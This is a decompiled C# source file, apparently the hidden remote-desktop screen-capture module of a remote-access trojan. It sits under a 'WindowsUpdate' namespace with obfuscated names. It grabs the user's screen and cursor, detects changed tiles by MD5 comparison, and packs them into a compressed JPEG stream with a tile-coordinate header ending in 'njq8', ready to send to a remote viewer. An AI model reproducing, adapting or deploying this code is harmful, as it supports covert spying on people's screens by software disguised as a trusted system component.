using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsUpdate;

public class CRDP
{
	private static List<Bitmap> OA = new List<Bitmap>();

	private static List<Point> OAA = new List<Point>();

	private static Bitmap OM = new Bitmap(1, 1);

	private static int oQ = 0;

	private static int oCo = 0;

	private static int oQu = 0;

	[DebuggerNonUserCode]
	public CRDP()
	{
	}

	private static Size QZ(int q)
	{
		Size result = new Size(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		checked
		{
			switch (q)
			{
			case 0:
				return result;
			case 1:
				result.Width = (int)Math.Round((double)result.Width / 1.1);
				result.Height = (int)Math.Round((double)result.Height / 1.1);
				break;
			case 2:
				result.Width = (int)Math.Round((double)result.Width / 1.3);
				result.Height = (int)Math.Round((double)result.Height / 1.3);
				break;
			case 3:
				result.Width = (int)Math.Round((double)result.Width / 1.5);
				result.Height = (int)Math.Round((double)result.Height / 1.5);
				break;
			case 4:
				result.Width = (int)Math.Round((double)result.Width / 1.9);
				result.Height = (int)Math.Round((double)result.Height / 1.9);
				break;
			case 5:
				result.Width = (int)Math.Round((double)result.Width / 2.0);
				result.Height = (int)Math.Round((double)result.Height / 2.0);
				break;
			case 6:
				result.Width = (int)Math.Round((double)result.Width / 2.1);
				result.Height = (int)Math.Round((double)result.Height / 2.1);
				break;
			case 7:
				result.Width = (int)Math.Round((double)result.Width / 2.2);
				result.Height = (int)Math.Round((double)result.Height / 2.2);
				break;
			case 8:
				result.Width = (int)Math.Round((double)result.Width / 2.5);
				result.Height = (int)Math.Round((double)result.Height / 2.5);
				break;
			case 9:
				result.Width = (int)Math.Round((double)result.Width / 3.0);
				result.Height = (int)Math.Round((double)result.Height / 3.0);
				break;
			case 10:
				result.Width = (int)Math.Round((double)result.Width / 3.5);
				result.Height = (int)Math.Round((double)result.Height / 3.5);
				break;
			case 11:
				result.Width = (int)Math.Round((double)result.Width / 4.0);
				result.Height = (int)Math.Round((double)result.Height / 4.0);
				break;
			case 12:
				result.Width = (int)Math.Round((double)result.Width / 5.0);
				result.Height = (int)Math.Round((double)result.Height / 5.0);
				break;
			case 13:
				result.Width = (int)Math.Round((double)result.Width / 6.0);
				result.Height = (int)Math.Round((double)result.Height / 6.0);
				break;
			}
			result.Width = Conversions.ToInteger(Strings.Mid(result.Width.ToString(), 1, result.Width.ToString().Length - 1) + Conversions.ToString(0));
			result.Height = Conversions.ToInteger(Strings.Mid(result.Height.ToString(), 1, result.Height.ToString().Length - 1) + Conversions.ToString(0));
			return result;
		}
	}

	private static Image Gd(int Wi = 0, int He = 0, bool Sh = true)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		int width = Screen.get_PrimaryScreen().get_Bounds().Width;
		int height = Screen.get_PrimaryScreen().get_Bounds().Height;
		Bitmap val = new Bitmap(width, height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		val2.set_CompositingQuality((CompositingQuality)1);
		int width2 = Screen.get_PrimaryScreen().get_Bounds().Width;
		Rectangle rectangle = Screen.get_PrimaryScreen().get_Bounds();
		Size size = new Size(width2, rectangle.Height);
		val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
		if (Sh)
		{
			try
			{
				Cursor @default = Cursors.get_Default();
				Point position = Cursor.get_Position();
				size = new Size(32, 32);
				rectangle = new Rectangle(position, size);
				@default.Draw(val2, rectangle);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		val2.Dispose();
		if (Wi == 0 && He == 0)
		{
			return (Image)(object)val;
		}
		IntPtr intPtr = default(IntPtr);
		return ((Image)val).GetThumbnailImage(Wi, He, (GetThumbnailImageAbort)null, intPtr);
	}

	private static string md5(byte[] bB)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		bB = mD5CryptoServiceProvider.ComputeHash(bB);
		return Convert.ToBase64String(bB);
	}

	private static ImageCodecInfo GetEncoderInfo(string M)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		int num = imageEncoders.Length;
		int num2 = 0;
		while (true)
		{
			int num3 = num2;
			int num4 = num;
			if (num3 <= num4)
			{
				if (Operators.CompareString(imageEncoders[num2].get_MimeType(), M, false) == 0)
				{
					break;
				}
				num2 = checked(num2 + 1);
				continue;
			}
			return null;
		}
		return imageEncoders[num2];
	}

	public static void Clear()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		oQ = -1;
		oCo = -1;
		oQu = -1;
		OM = new Bitmap(1, 1);
	}

	public static byte[] Cap(int q, int co, int Qu)
	{
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0116: Expected O, but got Unknown
		//IL_0197: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Expected O, but got Unknown
		//IL_0284: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_03eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f2: Expected O, but got Unknown
		//IL_0568: Unknown result type (might be due to invalid IL or missing references)
		//IL_056e: Expected O, but got Unknown
		//IL_057c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0582: Expected O, but got Unknown
		Size size = new Size((Point)QZ(q));
		checked
		{
			size.Width = Conversions.ToInteger(Strings.Mid(size.Width.ToString(), 1, size.Width.ToString().Length - 1) + Conversions.ToString(0));
			size.Height = Conversions.ToInteger(Strings.Mid(size.Height.ToString(), 1, size.Height.ToString().Length - 1) + Conversions.ToString(0));
			if ((((Image)OM).get_Size().Width != size.Width) | (((Image)OM).get_Height() != size.Height) | (oCo != co) | (oQu != Qu))
			{
				OA.Clear();
				OAA.Clear();
				OM = new Bitmap(size.Width, size.Height);
			}
			oQ = q;
			oCo = co;
			oQu = Qu;
			List<Bitmap> list = new List<Bitmap>();
			List<Point> list2 = new List<Point>();
			Bitmap val;
			if (OA.Count > 0)
			{
				list.AddRange(OA.ToArray());
				OA.Clear();
				list2.AddRange(OAA.ToArray());
				OAA.Clear();
				val = OM;
			}
			else
			{
				val = (Bitmap)Gd(size.Width, size.Height);
				int width = size.Width;
				int height = size.Height;
				int num = co - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					int num5 = co - 1;
					int num6 = 0;
					while (true)
					{
						int num7 = num6;
						num4 = num5;
						if (num7 > num4)
						{
							break;
						}
						int y = (int)Math.Round((double)height / (double)co * (double)num2);
						int x = (int)Math.Round((double)width / (double)co * (double)num6);
						int num8 = (int)Math.Round((double)width / (double)co);
						int num9 = (int)Math.Round((double)height / (double)co);
						if (num8.ToString().Contains("."))
						{
							num8 = Conversions.ToInteger(Strings.Split(Conversions.ToString(num8), ".", -1, (CompareMethod)0)[0]);
						}
						if (num9.ToString().Contains("."))
						{
							num9 = Conversions.ToInteger(Strings.Split(Conversions.ToString(num9), ".", -1, (CompareMethod)0)[0]);
						}
						MemoryStream memoryStream = new MemoryStream();
						Bitmap obj = val;
						Rectangle rectangle = new Rectangle(x, y, num8, num9);
						Bitmap val2 = obj.Clone(rectangle, ((Image)val).get_PixelFormat());
						Bitmap oM = OM;
						rectangle = new Rectangle(x, y, num8, num9);
						Bitmap val3 = oM.Clone(rectangle, ((Image)val).get_PixelFormat());
						((Image)val2).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						byte[] bB = memoryStream.ToArray();
						memoryStream.Dispose();
						memoryStream = new MemoryStream();
						((Image)val3).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
						byte[] bB2 = memoryStream.ToArray();
						memoryStream.Dispose();
						if (Operators.CompareString(md5(bB), md5(bB2), false) == 0)
						{
							((Image)val2).Dispose();
						}
						else
						{
							list.Add(val2);
							Point item = new Point(x, y);
							list2.Add(item);
						}
						((Image)val3).Dispose();
						num6++;
					}
					num2++;
				}
			}
			if (list.Count == 0)
			{
				return new byte[1] { 0 };
			}
			int num10 = 0;
			List<int> list3 = new List<int>();
			int num11 = (int)Math.Round((double)(co * co) / 5.0);
			int num12 = 0;
			while (true)
			{
				int num13 = num12;
				int num4 = num11;
				if (num13 > num4 || num12 == list.Count)
				{
					break;
				}
				list3.Add(num12);
				num10 += ((Image)list[num12]).get_Height();
				num12++;
			}
			Bitmap val4 = new Bitmap(((Image)list[0]).get_Width(), num10);
			Graphics val5 = Graphics.FromImage((Image)(object)val4);
			int num14 = 0;
			string text = Conversions.ToString(((Image)val).get_Width()) + "." + Conversions.ToString(((Image)val).get_Height()) + ",";
			foreach (int item2 in list3)
			{
				text = text + Conversions.ToString(list2[item2].X) + "." + Conversions.ToString(list2[item2].Y) + "." + Conversions.ToString(((Image)list[item2]).get_Height()) + ",";
				val5.DrawImage((Image)(object)list[item2], 0, num14);
				num14 += ((Image)list[item2]).get_Height();
			}
			text += "njq8";
			int num15 = list.Count - 1;
			int num16 = 0;
			while (true)
			{
				int num17 = num16;
				int num4 = num15;
				if (num17 > num4)
				{
					break;
				}
				if (!list3.Contains(num16))
				{
					OA.Add(list[num16]);
					OAA.Add(list2[num16]);
				}
				num16++;
			}
			val5.Dispose();
			MemoryStream memoryStream2 = new MemoryStream();
			EncoderParameters val6 = new EncoderParameters(1);
			val6.get_Param()[0] = new EncoderParameter(Encoder.Quality, unchecked((long)Qu));
			ImageCodecInfo encoderInfo = GetEncoderInfo("image/jpeg");
			((Image)val4).Save((Stream)memoryStream2, encoderInfo, val6);
			MemoryStream memoryStream3 = new MemoryStream();
			memoryStream3.Write(Encoding.Default.GetBytes(text), 0, text.Length);
			memoryStream3.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
			OM = val;
			((Image)val4).Dispose();
			return memoryStream3.ToArray();
		}
	}
}
